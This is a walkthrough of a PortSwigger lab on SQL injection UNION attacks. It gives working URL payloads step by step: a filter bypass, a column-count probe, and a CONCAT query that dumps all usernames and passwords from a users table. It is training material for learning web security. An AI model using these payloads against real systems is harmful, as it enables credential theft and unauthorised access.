
# SQL injection UNION attack, retrieving multiple values in a single column

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

Hint: You can find some useful payloads on our SQL injection cheat sheet.

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/union-attacks

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


We see there is 1 value displayed in the table, the name of the product:



![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/1.png)


We find these payload are valid to display the 4 items in Gifts and the second all the items:

```
/filter?category=Gifts'--
/filter?category=Gifts'+or+1=1--
```

Also, that there are 2 columns returned by the query and we can do a UNION attack with:

```
/filter?category=Gifts'+union+all+select+NULL,NULL--
```



![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/2.png)

We can print strings using the second column in the attack and concatenate strings using CONCAT:

```
/filter?category=Gifts'+union+all+select+NULL,CONCAT('foo','bar')--
```



![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/3.png)


We can get content from both columns using SELECT CONCAT(username,':',password) from users:

```
/filter?category=Gifts'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
```



![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/4.png)
